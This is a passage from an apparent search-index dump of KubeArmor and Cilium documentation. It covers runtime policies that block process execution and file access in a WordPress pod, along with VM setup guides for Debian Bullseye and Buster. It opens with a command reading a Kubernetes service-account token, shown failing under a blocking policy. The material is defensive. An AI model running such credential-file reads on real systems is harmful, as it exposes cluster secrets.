kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# cat /run/secrets/kubernetes.io/serviceaccount/token cat: /run/secrets/kubernetes.io/serviceaccount/token: Permission denied Use-case 4: Block execution of unwanted processes A container image might get shipped with binaries that are not supposed to be executed in production environments. For e.g., WordPress contains apt , apt-get binaries that are used for dynamic package management. These should never be used in the production environment since it will create drift (change) in the container contents i.e., introduce new files/binaries that might increase the attack surface. The following policy Block the execution of such processes. Executing inside WordPress pod: Before applying policy kubectl exec -it wordpress-xxxxxxxxx-xxxxx -n wordpress-mysql -- bash root@wordpress-bf95888cb-2kx65:/var/www/html# apt root@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-wordpress-block-process namespace : wordpress-mysql spec : severity : 3 selector : matchLabels : app : wordpress process : matchPaths : - path : /usr/bin/apt - path : /usr/bin/apt-get action : Block Applying Policy: Applying above policy to deployed application kubectl apply -f ksp-wordpress-block-process.yaml Executing inside WordPress pod: After applying policy kubectl exec -it wordpress-5679855487-58rfz -n wordpress-mysql \u2013- bash root@wordpress-bf95888cb-2kx65:/var/www/html# apt bash: /usr/bin/apt: Permission denied root@wordpress-bf95888cb-2kx65:/var/www/html# apt-get update bash: /usr/bin/apt-get: Permission denied","title":"3. Demo Scenario &amp; Use-cases"},{"location":"open-source/quick_start_guide/#4-get-auto-discovered-policies","text":"In the above Demo Scenario (last 3 use-cases) , we had explicit Deny based policies. KubeArmor also supports Allow based policies i.e., allow only specific actions and audit/deny everything else. Also the allow-policies are auto-discovered by examining the workloads at runtime. To retrieve the auto discovered policies you can use: karmor discover -n wordpres-mysql -l \"app=wordpress\" -f yaml This discovers the policies for a workload in wordpress-mysql namespace having label app=wordpress . Output from karmor discover -n wordpress-mysql -l \"app=wordpress\" -f yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : autopol-system-3960684242 namespace : wordpress-mysql spec : action : Allow file : matchPaths : - fromSource : - path : /usr/sbin/apache2 path : /dev/urandom - fromSource : - path : /usr/local/bin/php path : /etc/hosts network : matchProtocols : - fromSource : - path : /usr/local/bin/php protocol : tcp - fromSource : - path : /usr/local/bin/php protocol : udp process : matchPaths : - path : /usr/sbin/apache2 - path : /usr/local/bin/php selector : matchLabels : app : wordpress severity : 1","title":"4. Get Auto-Discovered Policies"},{"location":"open-source/quick_start_guide/#5-uninstall","text":"karmor uninstall kubectl delete ns explorer","title":"5. Uninstall"},{"location":"open-source/quick_start_guide/#references","text":"Elastic and Splunk Integration Guide KubeArmor support matrix Integrating Kubearmor with Prometheus and Grafana","title":"References"},{"location":"open-source/what-is-cilium/","text":"Cilium | eBPF-based Networking, Observability, and Security \u00b6 Cilium is an open source project to provide eBPF-based networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms. The Cilium in use by Accuknox contains several upgrades including \u00b6 Accuknox has been contributing to Cilium and maintains a fork of the same (which is being upstreamed back to the primary distribution) with improvements in the following areas - Extensible Identity solution based on SPIFFE standards - Improving policy audit handling - Improving policy telemetry and statistics collection to fit realistic scenarios - Policy discovery tools. Where can I get the upgrades to Cilium \u00b6 Find upgrades to our Cilium policies by visiting our open source github repos at https://github.com/kubearmor/cilium Do we intend to maintain a separate version of Cilium? \u00b6 No. A fork exists to allow our community of users to directly access the feature upgrades that Accuknox is building. However all changes are being upstreamed to the community hosted at https://github.com/cilium","title":"What is Cilium?"},{"location":"open-source/what-is-cilium/#cilium-ebpf-based-networking-observability-and-security","text":"Cilium is an open source project to provide eBPF-based networking, security, and observability for cloud native environments such as Kubernetes clusters and other container orchestration platforms.","title":"Cilium | eBPF-based Networking, Observability, and Security"},{"location":"open-source/what-is-cilium/#the-cilium-in-use-by-accuknox-contains-several-upgrades-including","text":"Accuknox has been contributing to Cilium and maintains a fork of the same (which is being upstreamed back to the primary distribution) with improvements in the following areas - Extensible Identity solution based on SPIFFE standards - Improving policy audit handling - Improving policy telemetry and statistics collection to fit realistic scenarios - Policy discovery tools.","title":"The Cilium in use by Accuknox contains several upgrades including"},{"location":"open-source/what-is-cilium/#where-can-i-get-the-upgrades-to-cilium","text":"Find upgrades to our Cilium policies by visiting our open source github repos at https://github.com/kubearmor/cilium","title":"Where can I get the upgrades to Cilium"},{"location":"open-source/what-is-cilium/#do-we-intend-to-maintain-a-separate-version-of-cilium","text":"No. A fork exists to allow our community of users to directly access the feature upgrades that Accuknox is building. However all changes are being upstreamed to the community hosted at https://github.com/cilium","title":"Do we intend to maintain a separate version of Cilium?"},{"location":"open-source/what-is-kubearmor/","text":"KubeArmor | Cloud Native Runtime Security Enforcement System \u00b6 KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. KubeArmor operates with Linux security modules LSMs , meaning that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor , SELinux , or BPF-LSM ) are enabled in the Linux Kernel. KubeArmor will use the appropriate LSMs to enforce the required policies. KubeArmor allows operators to define security policies and apply them to Kubernetes. Then, KubeArmor will automatically detect the changes in security policies from Kubernetes and enforce them to the corresponding containers and nodes. If there are any violations against security policies, KubeArmor immediately generates alerts with container identities. If operators have any logging systems, it automatically sends the alerts to their systems as well. Functionality Overview \u00b6 Restrict the behavior of containers and nodes at the system level Traditional container security solutions (e.g., Cilium) protect containers by determining their inter-container relations (i.e., service flows) at the network level. In contrast, KubeArmor prevents malicious or unknown behaviors in containers by specifying their desired actions (e.g., a specific process should only be allowed to access a sensitive file) . KubeArmor also allows operators to restrict the behaviors of nodes based on node identities. Enforce security policies to containers in runtime In general, security policies (e.g., Seccomp and AppArmor profiles) are statically defined within pod definitions for Kubernetes, and they are applied to containers at creation time. Then, the security policies are not allowed to be updated in runtime. To avoid this problem, KubeArmor maintains security policies separately, which means that security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies into Linux security modules LSMs for each container according to the labels of given containers and security policies. Produce container-aware alerts and system logs LSMs do not have any container-related information; thus, they generate alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID) . Therefore, it is hard to figure out what containers cause policy violations. To address this problem, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers, and converts system metadata to container identities when LSMs generate alerts and system logs for any policy violations from containers. Provide easy-to-use semantics for policy definitions KubeArmor provides the ability to monitor the life cycles of containers' processes and take policy decisions based on them. In general, it is much easier to deny a specific action but it is more difficult to allow only specific actions while denying all. KubeArmor manages internal complexities associated with handling such policy decisions and provides easy semantics towards policy language. Support network security enforcement among containers KubeArmor aims to protect containers themselves rather than interactions among containers. However, using KubeArmor a user can add policies that could apply policy settings at the level of network system calls (e.g., bind(), listen(), accept(), and connect()) , thus somewhat controlling interactions among containers.","title":"What is KubeArmor?"},{"location":"open-source/what-is-kubearmor/#kubearmor-cloud-native-runtime-security-enforcement-system","text":"KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. KubeArmor operates with Linux security modules LSMs , meaning that it can work on top of any Linux platforms (such as Alpine, Ubuntu, and Container-optimized OS from Google) if Linux security modules (e.g., AppArmor , SELinux , or BPF-LSM ) are enabled in the Linux Kernel. KubeArmor will use the appropriate LSMs to enforce the required policies. KubeArmor allows operators to define security policies and apply them to Kubernetes. Then, KubeArmor will automatically detect the changes in security policies from Kubernetes and enforce them to the corresponding containers and nodes. If there are any violations against security policies, KubeArmor immediately generates alerts with container identities. If operators have any logging systems, it automatically sends the alerts to their systems as well.","title":"KubeArmor | Cloud Native Runtime Security Enforcement System"},{"location":"open-source/what-is-kubearmor/#functionality-overview","text":"Restrict the behavior of containers and nodes at the system level Traditional container security solutions (e.g., Cilium) protect containers by determining their inter-container relations (i.e., service flows) at the network level. In contrast, KubeArmor prevents malicious or unknown behaviors in containers by specifying their desired actions (e.g., a specific process should only be allowed to access a sensitive file) . KubeArmor also allows operators to restrict the behaviors of nodes based on node identities. Enforce security policies to containers in runtime In general, security policies (e.g., Seccomp and AppArmor profiles) are statically defined within pod definitions for Kubernetes, and they are applied to containers at creation time. Then, the security policies are not allowed to be updated in runtime. To avoid this problem, KubeArmor maintains security policies separately, which means that security policies are no longer tightly coupled with containers. Then, KubeArmor directly applies the security policies into Linux security modules LSMs for each container according to the labels of given containers and security policies. Produce container-aware alerts and system logs LSMs do not have any container-related information; thus, they generate alerts and system logs only based on system metadata (e.g., User ID, Group ID, and process ID) . Therefore, it is hard to figure out what containers cause policy violations. To address this problem, KubeArmor uses an eBPF-based system monitor, which keeps track of process life cycles in containers, and converts system metadata to container identities when LSMs generate alerts and system logs for any policy violations from containers. Provide easy-to-use semantics for policy definitions KubeArmor provides the ability to monitor the life cycles of containers' processes and take policy decisions based on them. In general, it is much easier to deny a specific action but it is more difficult to allow only specific actions while denying all. KubeArmor manages internal complexities associated with handling such policy decisions and provides easy semantics towards policy language. Support network security enforcement among containers KubeArmor aims to protect containers themselves rather than interactions among containers. However, using KubeArmor a user can add policies that could apply policy settings at the level of network system calls (e.g., bind(), listen(), accept(), and connect()) , thus somewhat controlling interactions among containers.","title":"Functionality Overview"},{"location":"open-source/bullseye/bullseye/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on kubernetes workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice Step 3: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VMs: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Note: Docker needs to install before running the script. Install pre-requisites: sudo apt install bpfcc-tools linux-headers- $( uname -r ) vi testvm1.sh Comment the following line on the script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps Step 7: Install Kubearmor on worker VMs \u00b6 Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command. $apt --fix-broken install to fix the error & reinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 8: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm --kvms policy add khp-example-vmname.yaml Step 9: Policy Violation \u00b6 With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log Step 10: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www.google.co.in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 11: Policy Violation \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Bullseye"},{"location":"open-source/bullseye/bullseye/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 11 (Bullseye) with 5.10 Kernel Version by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/bullseye/bullseye/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/bullseye/bullseye/#step-2-install-kvm-service-in-control-plane","text":"Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/bullseye/bullseye/#step-3-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/bullseye/bullseye/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VMs: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/bullseye/bullseye/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/bullseye/bullseye/#step-6-execute-the-installation-script-in-vms","text":"Note: Docker needs to install before running the script. Install pre-requisites: sudo apt install bpfcc-tools linux-headers- $( uname -r ) vi testvm1.sh Comment the following line on the script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/bullseye/bullseye/#step-7-install-kubearmor-on-worker-vms","text":"Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command. $apt --fix-broken install to fix the error & reinstall $dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 7: Install Kubearmor on worker VMs"},{"location":"open-source/bullseye/bullseye/#step-8-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm --kvms policy add khp-example-vmname.yaml","title":"Step 8: Apply and Verify Kubearmor system policy"},{"location":"open-source/bullseye/bullseye/#step-9-policy-violation","text":"With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"Step 9: Policy Violation"},{"location":"open-source/bullseye/bullseye/#step-10-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www.google.co.in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 10: Apply and Verify Cilium network policy"},{"location":"open-source/bullseye/bullseye/#step-11-policy-violation","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 11: Policy Violation"},{"location":"open-source/buster/buster/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on kubernetes workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Download the Latest deb Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice Step 3: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list Step 5: Generate Installation scripts for configured worker VMs \u00b6 Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1 Step 6: Execute the Installation script in VMs \u00b6 Install pre-requisites: Docker needs to install before running the script. Repositories: /etc/apt/sources.list should include the non-free repository and look something like this: vi /etc/apt/sources.list Add the following: deb http://deb.debian.org/debian sid main contrib non-free deb-src http://deb.debian.org/debian sid main contrib non-free Install Build dependencies: apt-get update According to debian.org sudo apt-get install arping bison clang-format cmake dh-python \\ dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\ libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\ libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\ luajit python3-netaddr python3-pyroute2 python3-distutils python3 Install and Compile BCC: git clone https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build sudo make install cmake .. make Install linux-headers: sudo apt install linux-headers- $( uname -r ) Note: If youre getting this following error, Follow this steps to slove the error. sudo make install apt install gcc-8 sudo apt install linux-headers- $( uname -r ) Comment the following line on the script and save it: vi testvm1.sh #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To Onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps Step 7: Install Kubearmor on worker VMs \u00b6 Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command to fix the error. apt --fix-broken install dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 8: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : /usr/bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml Step 9: Policy Violation \u00b6 sleep 10 Verifying policy Violation logs: karmor log Step 10: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Step 11: Policy Violation on worker node \u00b6 curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Buster"},{"location":"open-source/buster/buster/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Debian 10 (Buster) with 4.19 Kernel Version by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/buster/buster/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: sudo service etcd restart sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/buster/buster/#step-2-install-kvm-service-in-control-plane","text":"Download the Latest deb Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.deb dpkg -i kvmservice_0.1_linux-amd64.deb systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/buster/buster/#step-3-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/buster/buster/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/buster/buster/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM Installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/buster/buster/#step-6-execute-the-installation-script-in-vms","text":"Install pre-requisites: Docker needs to install before running the script. Repositories: /etc/apt/sources.list should include the non-free repository and look something like this: vi /etc/apt/sources.list Add the following: deb http://deb.debian.org/debian sid main contrib non-free deb-src http://deb.debian.org/debian sid main contrib non-free Install Build dependencies: apt-get update According to debian.org sudo apt-get install arping bison clang-format cmake dh-python \\ dpkg-dev pkg-kde-tools ethtool flex inetutils-ping iperf \\ libbpf-dev libclang-dev libclang-cpp-dev libedit-dev libelf-dev \\ libfl-dev libzip-dev linux-libc-dev llvm-dev libluajit-5.1-dev \\ luajit python3-netaddr python3-pyroute2 python3-distutils python3 Install and Compile BCC: git clone https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build sudo make install cmake .. make Install linux-headers: sudo apt install linux-headers- $( uname -r ) Note: If youre getting this following error, Follow this steps to slove the error. sudo make install apt install gcc-8 sudo apt install linux-headers- $( uname -r ) Comment the following line on the script and save it: vi testvm1.sh #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To Onboard more worker VM repeat Step 4, Step 5 & Step 6. You can Verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/buster/buster/#step-7-install-kubearmor-on-worker-vms","text":"Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb dpkg -i kubearmor_0.3.1_linux-amd64.deb Note: While Installing if you get the following error, Run the following command to fix the error. apt --fix-broken install dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 7: Install Kubearmor on worker VMs"},{"location":"open-source/buster/buster/#step-8-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : 